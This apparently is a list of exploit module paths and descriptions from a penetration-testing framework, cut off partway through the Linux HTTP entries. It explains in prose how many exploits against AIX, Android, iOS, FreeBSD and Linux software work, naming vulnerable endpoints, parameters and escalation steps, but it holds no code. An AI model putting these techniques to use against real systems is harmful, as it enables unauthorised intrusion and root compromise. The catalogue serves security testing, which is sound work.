aix/local/ibstat_path
This module exploits the trusted $PATH environment variable of the SUID binary "ibstat".

aix/local/invscout_rpm_priv_esc
This module exploits a command injection vulnerability in IBM AIX invscout set-uid root utility present in AIX 7.2 and earlier. The undocumented -rpm argument can be used to install an RPM file; and the undocumented -o argument passes arguments to the rpm utility without validation, leading to command injection with effective-uid root privileges. This module has been tested successfully on AIX 7.2.

aix/local/xorg_x11_server
WARNING: Successful execution of this module results in /etc/passwd being overwritten. This module is a port of the OpenBSD X11 Xorg exploit to run on AIX. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1. Due to permission restrictions of the crontab in AIX, this module does not use cron, and instead overwrites /etc/passwd in order to create a new user with root privileges. All currently logged in users need to be included when /etc/passwd is overwritten, else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user. The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX, and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when overwriting /etc/passwd.

aix/rpc_cmsd_opcode21
This module exploits a buffer overflow vulnerability in opcode 21 handled by rpc.cmsd on AIX. By making a request with a long string passed to the first argument of the "rtable_create" RPC, a stack based buffer overflow occurs. This leads to arbitrary code execution. NOTE: Unsuccessful attempts may cause inetd/portmapper to enter a state where further attempts are not possible.

aix/rpc_ttdbserverd_realpath
This module exploits a buffer overflow vulnerability in _tt_internal_realpath function of the ToolTalk database server (rpc.ttdbserverd).

android/adb/adb_server_exec
Writes and spawns a native payload on an android device that is listening for adb debug messages.

android/browser/samsung_knox_smdm_url
A vulnerability exists in the KNOX security component of the Samsung Galaxy firmware that allows a remote webpage to install an APK with arbitrary permissions by abusing the 'smdm://' protocol handler registered by the KNOX component. The vulnerability has been confirmed in the Samsung Galaxy S4, S5, Note 3, and Ace 4.

android/browser/stagefright_mp4_tx3g_64bit
This module exploits an integer overflow vulnerability in the Stagefright Library (libstagefright.so). The vulnerability occurs when parsing specially crafted MP4 files. While a wide variety of remote attack vectors exist, this particular exploit is designed to work within an HTML5 compliant browser. Exploitation is done by supplying a specially crafted MP4 file with two tx3g atoms that, when their sizes are summed, cause an integer overflow when processing the second atom. As a result, a temporary buffer is allocated with insufficient size and a memcpy call leads to a heap overflow. This version of the exploit uses a two-stage information leak based on corrupting the MetaData that the browser reads from mediaserver. This method is based on a technique published in NorthBit's Metaphor paper. First, we use a variant of their technique to read the address of a heap buffer located adjacent to a SampleIterator object as the video HTML element's videoHeight. Next, we read the vtable pointer from an empty Vector within the SampleIterator object using the video element's duration. This gives us a code address that we can use to determine the base address of libstagefright and construct a ROP chain dynamically. NOTE: the mediaserver process on many Android devices (Nexus, for example) is constrained by SELinux and thus cannot use the execve system call. To avoid this problem, the original exploit uses a kernel exploit payload that disables SELinux and spawns a shell as root. Work is underway to make the framework more amenable to these types of situations. Until that work is complete, this exploit will only yield a shell on devices without SELinux or with SELinux in permissive mode.

android/browser/webview_addjavascriptinterface
This module exploits a privilege escalation issue in Android < 4.2's WebView component that arises when untrusted Javascript code is executed by a WebView that has one or more Interfaces added to it. The untrusted Javascript code can call into the Java Reflection APIs exposed by the Interface and execute arbitrary commands. Some distributions of the Android Browser app have an addJavascriptInterface call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs 4.1.2 release of Android is known to be vulnerable. A secondary attack vector involves the WebViews embedded inside a large number of Android applications. Ad integrations are perhaps the worst offender here. If you can MITM the WebView's HTTP connection, or if you can get a persistent XSS into the page displayed in the WebView, then you can inject the html/js served by this module and get a shell. Note: Adding a .js to the URL will return plain javascript (no HTML markup).

android/fileformat/adobe_reader_pdf_js_interface
Adobe Reader versions less than 11.2.0 exposes insecure native interfaces to untrusted javascript in a PDF. This module embeds the browser exploit from android/webview_addjavascriptinterface into a PDF to get a command shell on vulnerable versions of Reader.

android/local/binder_uaf
This module exploits CVE-2019-2215, which is a use-after-free in Binder in the Android kernel. The bug is a local privilege escalation vulnerability that allows for a full compromise of a vulnerable device. If chained with a browser renderer exploit, this bug could fully compromise a device through a malicious website. The freed memory is replaced with an iovec structure in order to leak a pointer to the task_struct. Finally the bug is triggered again in order to overwrite the addr_limit, making all memory (including kernel memory) accessible as part of the user-space memory range in our process and allowing arbitrary reading and writing of kernel memory.

android/local/futex_requeue
This module exploits a bug in futex_requeue in the Linux kernel, using similar techniques employed by the towelroot exploit. Any Android device with a kernel built before June 2014 is likely to be vulnerable.

android/local/janus
This module exploits CVE-2017-13156 in Android to install a payload into another application. The payload APK will have the same signature and can be installed as an update, preserving the existing data. The vulnerability was fixed in the 5th December 2017 security patch, and was additionally fixed by the APK Signature scheme v2, so only APKs signed with the v1 scheme are vulnerable. Payload handler is disabled, and a multi/handler must be started first.

android/local/put_user_vroot
This module exploits a missing check in the get_user and put_user API functions in the linux kernel before 3.5.5. The missing checks on these functions allow an unprivileged user to read and write kernel memory. This exploit first reads the kernel memory to identify the commit_creds and ptmx_fops address, then uses the write primitive to execute shellcode as uid 0. The exploit was first discovered in the wild in the vroot rooting application.

android/local/su_exec
This module uses the su binary present on rooted devices to run a payload as root. A rooted Android device will contain a su binary (often linked with an application) that allows the user to run commands as root. This module will use the su binary to execute a command stager as root. The command stager will write a payload binary to a temporary directory, make it executable, execute it in the background, and finally delete the executable. On most devices the su binary will pop-up a prompt on the device asking the user for permission.

apple_ios/browser/safari_jit
This module exploits a JIT optimization bug in Safari Webkit. This allows us to write shellcode to an RWX memory section in JavaScriptCore and execute it. The shellcode contains a kernel exploit (CVE-2016-4669) that obtains kernel rw, obtains root and disables code signing. Finally we download and execute the meterpreter payload. This module has been tested against iOS 7.1.2 on an iPhone 4.

apple_ios/browser/safari_libtiff
This module exploits a buffer overflow in the version of libtiff shipped with firmware versions 1.00, 1.01, 1.02, and 1.1.1 of the Apple iPhone. iPhones which have not had the BSD tools installed will need to use a special payload.

apple_ios/browser/webkit_createthis
This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233). The type confusion leads to the ability to allocate fake Javascript objects, as well as the ability to find the address in memory of a Javascript object. This allows us to construct a fake JSCell object that can be used to read and write arbitrary memory from Javascript. The module then uses a ROP chain to write the first stage shellcode into executable memory within the Safari process and kick off its execution. The first stage maps the second stage macho (containing CVE-2017-13861) into executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake exploit leads to a kernel task port (TFP0) that can read and write arbitrary kernel memory. The processes credential and sandbox structure in the kernel is overwritten and the meterpreter payloads code signature hash is added to the kernels trust cache, allowing Safari to load and execute the (self-signed) meterpreter payload.

apple_ios/browser/webkit_trident
This module exploits a UAF vulnerability in WebKit's JavaScriptCore library.

apple_ios/email/mobilemail_libtiff
This module exploits a buffer overflow in the version of libtiff shipped with firmware versions 1.00, 1.01, 1.02, and 1.1.1 of the Apple iPhone. iPhones which have not had the BSD tools installed will need to use a special payload.

apple_ios/ssh/cydia_default_ssh
This module exploits the default credentials of Apple iOS when it has been jailbroken and the passwords for the 'root' and 'mobile' users have not been changed.

bsd/finger/morris_fingerd_bof
This module exploits a stack buffer overflow in fingerd on 4.3BSD. This vulnerability was exploited by the Morris worm in 1988-11-02. Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg. Currently, only bsd/vax/shell_reverse_tcp is supported.

bsdi/softcart/mercantec_softcart
This is an exploit for an undisclosed buffer overflow in the SoftCart.exe CGI as shipped with Mercantec's shopping cart software. It is possible to execute arbitrary code by passing a malformed CGI parameter in an HTTP GET request. This issue is known to affect SoftCart version 4.00b.

dialup/multi/login/manyargs
This exploit connects to a system's modem over dialup and exploits a buffer overflow vulnerability in it's System V derived /bin/login. The vulnerability is triggered by providing a large number of arguments.

firefox/local/exec_shellcode
This module allows execution of native payloads from a privileged Firefox Javascript shell. It places the specified payload into memory, adds the necessary protection flags, and calls it, which can be useful for upgrading a Firefox javascript shell to a Meterpreter session without touching the disk.

freebsd/ftp/proftp_telnet_iac
This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code.

freebsd/http/citrix_dir_traversal_rce
This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload.

freebsd/http/citrix_formssso_target_rce
A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the nsppe process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root.

freebsd/http/junos_phprc_auto_prepend_file
This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls and EX switches. The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being 'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP function is 'allow_url_include' which allows the use of URL-aware fopen wrappers. By enabling allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file. The module then uses data:// to provide a file inline which includes the base64 encoded PHP payload. By default this exploit returns a session confined to a FreeBSD jail with limited functionality. There is a datastore option 'JAIL_BREAK', that when set to true, will steal the necessary tokens from a user authenticated to the J-Web application, in order to overwrite the the root password hash. If there is no user authenticated to the J-Web application this method will not work. The module then authenticates with the new root password over SSH and then rewrites the original root password hash to /etc/master.passwd.

freebsd/http/watchguard_cmd_exec
This module exploits two separate vulnerabilities found in the Watchguard XCS virtual appliance to gain command execution. By exploiting an unauthenticated SQL injection, a remote attacker may insert a valid web user into the appliance database, and get access to the web interface. On the other hand, a vulnerability in the web interface allows the attacker to inject operating system commands as the 'nobody' user.

freebsd/local/intel_sysret_priv_esc
This module exploits a vulnerability in the FreeBSD kernel, when running on 64-bit Intel processors. By design, 64-bit processors following the X86-64 specification will trigger a general protection fault (GPF) when executing a SYSRET instruction with a non-canonical address in the RCX register. However, Intel processors check for a non-canonical address prior to dropping privileges, causing a GPF in privileged mode. As a result, the current userland RSP stack pointer is restored and executed, resulting in privileged code execution. This module has been tested successfully on: FreeBSD 8.3-RELEASE (amd64); and FreeBSD 9.0-RELEASE (amd64).

freebsd/local/ip6_setpktopt_uaf_priv_esc
This module exploits a race and use-after-free vulnerability in the FreeBSD kernel IPv6 socket handling. A missing synchronization lock in the `IPV6_2292PKTOPTIONS` option handling in `setsockopt` permits racing `ip6_setpktopt` access to a freed `ip6_pktopts` struct. This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts` struct in freed memory to achieve arbitrary kernel read/write. This module has been tested successfully on: FreeBSD 9.0-RELEASE #0 (amd64); FreeBSD 9.1-RELEASE #0 r243825 (amd64); FreeBSD 9.2-RELEASE #0 r255898 (amd64); FreeBSD 9.3-RELEASE #0 r268512 (amd64); FreeBSD 12.0-RELEASE r341666 (amd64); and FreeBSD 12.1-RELEASE r354233 (amd64).

freebsd/local/mmap
This module exploits a vulnerability that can be used to modify portions of a process's address space, which may lead to privilege escalation. Systems such as FreeBSD 9.0 and 9.1 are known to be vulnerable.

freebsd/local/rtld_execl_priv_esc
This module exploits a vulnerability in the FreeBSD run-time link-editor (rtld). The rtld `unsetenv()` function fails to remove `LD_*` environment variables if `__findenv()` fails. This can be abused to load arbitrary shared objects using `LD_PRELOAD`, resulting in privileged code execution. This module has been tested successfully on: FreeBSD 7.2-RELEASE (amd64); and FreeBSD 8.0-RELEASE (amd64).

freebsd/local/watchguard_fix_corrupt_mail
This module exploits a vulnerability in the Watchguard XCS 'FixCorruptMail' script called by root's crontab which can be exploited to run a command as root within 3 minutes.

freebsd/misc/citrix_netscaler_soap_bof
This module exploits a memory corruption vulnerability on the Citrix NetScaler Appliance. The vulnerability exists in the SOAP handler, accessible through the web interface. A malicious SOAP requests can force the handler to connect to a malicious NetScaler config server. This malicious config server can send a specially crafted response in order to trigger a memory corruption and overwrite data in the stack, to finally execute arbitrary code with the privileges of the web server running the SOAP handler. This module has been tested successfully on the NetScaler Virtual Appliance 450010.

freebsd/samba/trans2open
This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set.

freebsd/tacacs/xtacacsd_report
This module exploits a stack buffer overflow in XTACACSD <= 4.1.2. By sending a specially crafted XTACACS packet with an overly long username, an attacker may be able to execute arbitrary code.

freebsd/telnet/telnet_encrypt_keyid
This module exploits a buffer overflow in the encryption option handler of the FreeBSD telnet service.

freebsd/webapp/spamtitan_unauth_rce
TitanHQ SpamTitan Gateway is an anti-spam appliance that protects against unwanted emails and malwares. This module exploits an improper input sanitization in versions 7.01, 7.02, 7.03 and 7.07 to inject command directives into the SNMP configuration file and get remote code execution as root. Note that only version 7.03 needs authentication and no authentication is required for versions 7.01, 7.02 and 7.07. First, it sends an HTTP POST request to the `snmp-x.php` page with an `SNMPD` command directives (`extend` + command) passed to the `community` parameter. This payload is then added to `snmpd.conf` by the application. Finally, the module triggers the execution of this command by querying the SNMP server for the correct OID. This exploit module has been successfully tested against versions 7.01, 7.02, 7.03, and 7.07.

hpux/lpd/cleanup_exec
This exploit abuses an unpublished vulnerability in the HP-UX LPD service. This flaw allows an unauthenticated attacker to execute arbitrary commands with the privileges of the root user. The LPD service is only exploitable when the address of the attacking system can be resolved by the target. This vulnerability was silently patched with the buffer overflow flaws addressed in HP Security Bulletin HPSBUX0208-213.

irix/lpd/tagprinter_exec
This module exploits an arbitrary command execution flaw in the in.lpd service shipped with all versions of Irix.

linux/antivirus/escan_password_exec
This module exploits a command injection vulnerability found in the eScan Web Management Console. The vulnerability exists while processing CheckPass login requests. An attacker with a valid username can use a malformed password to execute arbitrary commands. With mwconf privileges, the runasroot utility can be abused to get root privileges. This module has been tested successfully on eScan 5.5-2 on Ubuntu 12.04.

linux/browser/adobe_flashplayer_aslaunch
This module exploits a vulnerability in Adobe Flash Player for Linux, version 10.0.12.36 and 9.0.151.0 and prior. An input validation vulnerability allows command execution when the browser loads a SWF file which contains shell metacharacters in the arguments to the ActionScript launch method. The victim must have Adobe AIR installed for the exploit to work. This module was tested against version 10.0.12.36 (10r12_36).

linux/fileformat/unrar_cve_2022_30333
This module creates a RAR file that exploits CVE-2022-30333, which is a path-traversal vulnerability in unRAR that can extract an arbitrary file to an arbitrary location on a Linux system. UnRAR fixed this vulnerability in version 6.12 (open source version 6.1.7). The core issue is that when a symbolic link is unRAR'ed, Windows symbolic links are not properly validated on Linux systems and can therefore write a symbolic link that points anywhere on the filesystem. If a second file in the archive has the same name, it will be written to the symbolic link path.

linux/ftp/proftp_sreplace
This module exploits a stack-based buffer overflow in versions 1.2 through 1.3.0 of ProFTPD server. The vulnerability is within the "sreplace" function within the "src/support.c" file. The off-by-one heap overflow bug in the ProFTPD sreplace function has been discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit this off-by-one bug via MKD command, but failed. We did not work on this bug since then. Actually, there are exists at least two bugs in sreplace function, one is the mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow via 'sstrncpy(dst,src,negative argument)'. We were unable to reach the "sreplace" stack bug on ProFTPD 1.2.10 stable version, but the version 1.3.0rc3 introduced some interesting changes, among them: 1. another (integer) overflow in sreplace! 2. now it is possible to reach sreplace stack-based buffer overflow bug via the "pr_display_file" function! 3. stupid '.message' file display bug So we decided to choose ProFTPD 1.3.0 as a target for our exploit. To reach the bug, you need to upload a specially created .message file to a writeable directory, then do "CWD <writeable directory>" to trigger the invocation of sreplace function. Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message' file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug. The exploit is a part of VulnDisco Pack since Dec 2005.

linux/ftp/proftp_telnet_iac
This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code. The Debian Squeeze version of the exploit uses a little ROP stub to indirectly transfer the flow of execution to a pool buffer (the cmd_rec "res" in "pr_cmd_read"). The Ubuntu version uses a ROP stager to mmap RWX memory, copy a small stub to it, and execute the stub. The stub then copies the remainder of the payload in and executes it. NOTE: Most Linux distributions either do not ship a vulnerable version of ProFTPD, or they ship a version compiled with stack smashing protection. Although SSP significantly reduces the probability of a single attempt succeeding, it will not prevent exploitation. Since the daemon forks in a default configuration, the cookie value will remain the same despite some attempts failing. By making repeated requests, an attacker can eventually guess the cookie value and exploit the vulnerability. The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness and could allow exploitation in semi-reasonable amount of time.

linux/games/ut2004_secure
This is an exploit for the GameSpy secure query in the Unreal Engine. This exploit only requires one UDP packet, which can be both spoofed and sent to a broadcast address. Usually, the GameSpy query server listens on port 7787, but you can manually specify the port as well. The RunServer.sh script will automatically restart the server upon a crash, giving us the ability to bruteforce the service and exploit it multiple times.

linux/http/accellion_fta_getstatus_oauth
This module exploits a metacharacter shell injection vulnerability in the Accellion File Transfer appliance. This vulnerability is triggered when a user-provided 'oauth_token' is passed into a system() call within a mod_perl handler. This module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on version FTA_9_11_200, but may apply to previous versions as well. This issue was fixed in software update FTA_9_11_210.

linux/http/advantech_switch_bash_env_exec
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets the 'ping.sh' CGI script, accessible through the Boa web server on Advantech switches. This module was tested against firmware version 1322_D1.98.

linux/http/airties_login_cgi_bof
This module exploits a remote buffer overflow vulnerability on several Airties routers. The vulnerability exists in the handling of HTTP queries to the login cgi with long redirect parameters. The vulnerability doesn't require authentication. This module has been tested successfully on the AirTies_Air5650v3TT_FW_1.0.2.0.bin firmware with emulation. Other versions such as the Air6372, Air5760, Air5750, Air5650TT, Air5453, Air5444TT, Air5443, Air5442, Air5343, Air5342, Air5341, Air5021 are also reported as vulnerable.

linux/http/alcatel_omnipcx_mastercgi_exec
This module abuses a metacharacter injection vulnerability in the HTTP management interface of the Alcatel-Lucent OmniPCX Enterprise Communication Server 7.1 and earlier. The Unified Maintenance Tool contains a 'masterCGI' binary which allows an unauthenticated attacker to execute arbitrary commands by specifying shell metacharaters as the 'user' within the 'ping' action to obtain 'httpd' user access. This module only supports command line payloads, as the httpd process kills the reverse/bind shell spawn after the HTTP 200 OK response.

linux/http/alienvault_exec
This module exploits object injection, authentication bypass and ip spoofing vulnerabilities all together. Unauthenticated users can execute arbitrary commands under the context of the root user. By abusing authentication bypass issue on gauge.php lead adversaries to exploit object injection vulnerability which leads to SQL injection attack that leaks an administrator session token. Attackers can create a rogue action and policy that enables to execute operating system commands by using captured session token. As a final step, SSH login attempt with an invalid credentials can trigger a created rogue policy which triggers an action that executes operating system command with root user privileges. This module was tested against following product and versions: AlienVault USM 5.3.0, 5.2.5, 5.0.0, 4.15.11, 4.5.0 AlienVault OSSIM 5.0.0, 4.6.1

linux/http/alienvault_sqli_exec
This module exploits an unauthenticated SQL injection vulnerability affecting AlienVault OSSIM versions 4.3.1 and lower. The SQL injection issue can be abused in order to retrieve an active admin session ID. If an administrator level user is identified, remote code execution can be gained by creating a high priority policy with an action containing our payload.

linux/http/apache_airflow_dag_rce
This module exploits an unauthenticated command injection vulnerability by combining two critical vulnerabilities in Apache Airflow 1.10.10. The first, CVE-2020-11978, is an authenticated command injection vulnerability found in one of Airflow's example DAGs, "example_trigger_target_dag", which allows any authenticated user to run arbitrary OS commands as the user running Airflow Worker/Scheduler. The second, CVE-2020-13927, is a default setting of Airflow 1.10.10 that allows unauthenticated access to Airflow's Experimental REST API to perform malicious actions such as creating the vulnerable DAG above. The two CVEs taken together allow vulnerable DAG creation and command injection, leading to unauthenticated remote code execution.

linux/http/apache_continuum_cmd_exec
This module exploits a command injection in Apache Continuum <= 1.4.2. By injecting a command into the installation.varValue POST parameter to /continuum/saveInstallation.action, a shell can be spawned.

linux/http/apache_couchdb_cmd_exec
CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.

linux/http/apache_druid_js_rce
Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests; however, that feature is disabled by default. In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request that both enables the JavaScript code-execution feature and executes the supplied code all at once, allowing for code execution on the server with the privileges of the Druid Server process. More critically, authentication is not enabled in Apache Druid by default. Tested on the following Apache Druid versions: * 0.15.1 * 0.16.0-iap8 * 0.17.1 * 0.18.0-iap3 * 0.19.0-iap7 * 0.20.0-iap4.1 * 0.20.0 * 0.21.0-iap3

linux/http/apache_nifi_h2_rce
The DBCPConnectionPool and HikariCPConnectionPool Controller Services in Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user to configure a Database URL with the H2 driver that enables custom code execution. This exploit will result in several shells (5-7). Successfully tested against Apache nifi 1.17.0 through 1.21.0.

linux/http/apache_ofbiz_deserialization
This module exploits a Java deserialization vulnerability in Apache OFBiz's unauthenticated XML-RPC endpoint /webtools/control/xmlrpc for versions prior to 17.12.04.

linux/http/apache_ofbiz_deserialization_soap
This module exploits a Java deserialization vulnerability in Apache OFBiz's unauthenticated SOAP endpoint /webtools/control/SOAPService for versions prior to 17.12.06.

linux/http/apache_spark_rce_cve_2022_33891
This module exploits an unauthenticated command injection vulnerability in Apache Spark. Successful exploitation results in remote code execution under the context of the Spark application user. The command injection occurs because Spark checks the group membership of the user passed in the ?doAs parameter by using a raw Linux command. It is triggered by a non-default setting called spark.acls.enable. This configuration setting spark.acls.enable should be set true in the Spark configuration to make the application vulnerable for this attack. Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1 are affected by this vulnerability.

linux/http/apache_superset_cookie_sig_rce
Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies. These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user. From there the Superset database is mounted, and credentials are pulled. A dashboard is then created. Lastly a pickled python payload can be set for that dashboard within Superset's database which will trigger the RCE. An attempt to clean up ALL of the dashboard key values and reset them to their previous values happens during the cleanup phase.

linux/http/artica_proxy_auth_bypass_service_cmds_peform_command_injection
This module exploits an authenticated command injection vulnerability in Artica Proxy, combined with an authentication bypass discovered on the same version, it is possible to trigger the vulnerability without knowing the credentials. The application runs in virtual appliance, successful exploitation of this vulnerability yields remote code execution as root on the remote system.

linux/http/astium_sqli_upload
This module exploits vulnerabilities found in Astium astium-confweb-2.1-25399 RPM and lower. A SQL Injection vulnerability is used to achieve authentication bypass and gain admin access. From an admin session arbitrary PHP code upload is possible. It is used to add the final PHP payload to "/usr/local/astium/web/php/config.php" and execute the "sudo /sbin/service astcfgd reload" command to reload the configuration and achieve remote root code execution.

linux/http/asuswrt_lan_rce
The HTTP server in AsusWRT has a flaw where it allows an unauthenticated client to perform a POST in certain cases. This can be combined with another vulnerability in the VPN configuration upload routine that sets NVRAM configuration variables directly from the POST request to enable a special command mode. This command mode can then be abused by sending a UDP packet to infosvr, which is running on port UDP 9999 to directly execute commands as root. This exploit leverages that to start telnetd in a random port, and then connects to it. It has been tested with the RT-AC68U running AsusWRT Version 3.0.0.4.380.7743.

linux/http/atutor_filemanager_traversal
This module exploits a directory traversal vulnerability in ATutor on an Apache/PHP setup with display_errors set to On, which can be used to allow us to upload a malicious ZIP file. On the web application, a blacklist verification is performed before extraction, however it is not sufficient to prevent exploitation. You are required to login to the target to reach the vulnerability, however this can be done as a student account and remote registration is enabled by default. Just in case remote registration isn't enabled, this module uses 2 vulnerabilities in order to bypass the authentication: 1. confirm.php Authentication Bypass Type Juggling vulnerability 2. password_reminder.php Remote Password Reset TOCTOU vulnerability

linux/http/axis_app_install
This module exploits the "Apps" feature in Axis IP cameras. The feature allows third party developers to upload and execute 'eap' applications on the device. The system does not validate the application comes from a trusted source, so a malicious attacker can upload and execute arbitrary code. The issue has no CVE, although the technique was made public in 2018. This module uploads and executes stageless meterpreter as `root`. Uploading the application requires valid credentials. The default administrator credentials used to be `root:root` but newer firmware versions force users to provide a new password for the `root` user. The module was tested on an Axis M3044-V using the latest firmware (9.80.3.8: December 2021). Although all modules that support the "Apps" feature are presumed to be vulnerable.

linux/http/axis_srv_parhand_rce
This module exploits an auth bypass in .srv functionality and a command injection in parhand to execute code as the root user.

linux/http/belkin_login_bof
This module exploits a remote buffer overflow vulnerability on Belkin Play N750 DB Wireless Dual-Band N+ Router N750 routers. The vulnerability exists in the handling of HTTP queries with long 'jump' parameters addressed to the /login.cgi URL, allowing remote unauthenticated attackers to execute arbitrary code. This module was tested in an emulated environment, using the version 1.10.16.m of the firmware.

linux/http/bitbucket_git_cmd_injection
Various versions of Bitbucket Server and Data Center are vulnerable to an unauthenticated command injection vulnerability in multiple API endpoints. The `/rest/api/latest/projects/{projectKey}/repos/{repositorySlug}/archive` endpoint creates an archive of the repository, leveraging the `git-archive` command to do so. Supplying NULL bytes to the request enables the passing of additional arguments to the command, ultimately enabling execution of arbitrary commands.

linux/http/bludit_upload_images_exec
This module exploits a vulnerability in Bludit. A remote user could abuse the uuid parameter in the image upload feature in order to save a malicious payload anywhere onto the server, and then use a custom .htaccess file to bypass the file extension check to finally get remote code execution.

linux/http/cacti_unauthenticated_cmd_injection
This module exploits an unauthenticated command injection vulnerability in Cacti through 1.2.22 (CVE-2022-46169) in order to achieve unauthenticated remote code execution as the www-data user. The module first attempts to obtain the Cacti version to see if the target is affected. If LOCAL_DATA_ID and/or HOST_ID are not set, the module will try to bruteforce the missing value(s). If a valid combination is found, the module will use these to attempt exploitation. If LOCAL_DATA_ID and/or HOST_ID are both set, the module will immediately attempt exploitation. During exploitation, the module sends a GET request to /remote_agent.php with the action parameter set to polldata and the X-Forwarded-For header set to the provided value for X_FORWARDED_FOR_IP (by default 127.0.0.1). In addition, the poller_id parameter is set to the payload and the host_id and local_data_id parameters are set to the bruteforced or provided values. If X_FORWARDED_FOR_IP is set to an address that is resolvable to a hostname in the poller table, and the local_data_id and host_id values are vulnerable, the payload set for poller_id will be executed by the target. This module has been successfully tested against Cacti version 1.2.22 running on Ubuntu 21.10 (vulhub docker image)

linux/http/cayin_cms_ntp
This module exploits an authenticated RCE in Cayin CMS <= 11.0. The RCE is executed in the system_service.cgi file's ntpIp Parameter. The field is limited in size, so repeated requests are made to achieve a larger payload. Cayin CMS-SE is built for Ubuntu 16.04 (20.04 failed to install correctly), so the environment should be pretty set and not dynamic between targets. Results in root level access.

linux/http/centreon_pollers_auth_rce
An authenticated user with sufficient administrative rights to manage pollers can use this functionality to execute arbitrary commands remotely. Usually, the miscellaneous commands are used by the additional modules (to perform certain actions), by the scheduler for data processing, etc. This module uses this functionality to obtain a remote shell on the target.

linux/http/centreon_sqli_exec
This module exploits several vulnerabilities on Centreon 2.5.1 and prior and Centreon Enterprise Server 2.2 and prior. Due to a combination of SQL injection and command injection in the displayServiceStatus.php component, it is possible to execute arbitrary commands as long as there is a valid session registered in the centreon.session table. In order to have a valid session, all it takes is a successful login from anybody. The exploit itself does not require any authentication. This module has been tested successfully on Centreon Enterprise Server 2.2.

linux/http/centreon_useralias_exec
Centreon Web Interface <= 2.5.3 utilizes an ECHO for logging SQL errors. This functionality can be abused for arbitrary code execution, and can be triggered via the login screen prior to authentication.

linux/http/cfme_manageiq_evm_upload_exec
This module exploits a path traversal vulnerability in the "linuxpkgs" action of "agent" controller of the Red Hat CloudForms Management Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier). It uploads a fake controller to the controllers directory of the Rails application with the encoded payload as an action and sends a request to this action to execute the payload. Optionally, it can also upload a routing file containing a route to the action. (Which is not necessary, since the application already contains a general default route.)

linux/http/chamilo_unauth_rce_cve_2023_34960
Chamilo is an e-learning platform, also called Learning Management Systems (LMS). This module exploits an unauthenticated remote command execution vulnerability that affects Chamilo versions `1.11.18` and below (CVE-2023-34960). Due to a functionality called Chamilo Rapid to easily convert PowerPoint slides to courses on Chamilo, it is possible for an unauthenticated remote attacker to execute arbitrary commands at OS level using a malicious SOAP request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.

linux/http/cisco_asax_sfr_rce
This module exploits an authenticated command injection vulnerability affecting Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's ASDM web server and lands in the FirePower Services SFR module's Linux virtual machine as the root user. Access to the virtual machine allows the attacker to pivot to the inside network, and access the outside network. Also, the SFR virtual machine is running snort on the traffic flowing through the ASA, so the attacker should have access to this diverted traffic as well. This module requires ASDM credentials in order to traverse the ASDM interface. A similar attack can be performed via Cisco CLI (over SSH), although that isn't implemented here. Finally, it's worth noting that this attack bypasses the affects of the `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be available but this attack makes it available). Cisco assigned this issue CVE-2022-20828. The issue affects all Cisco ASA that support the ASA FirePOWER module (at least Cisco ASA-X with FirePOWER Service, and Cisco ISA 3000). The vulnerability has been patched in ASA FirePOWER module versions 6.2.3.19, 6.4.0.15, 6.6.7, and 7.0.21. The following versions will receive no patch: 6.2.2 and earlier, 6.3.*, 6.5.*, and 6.7.*.

linux/http/cisco_firepower_useradd
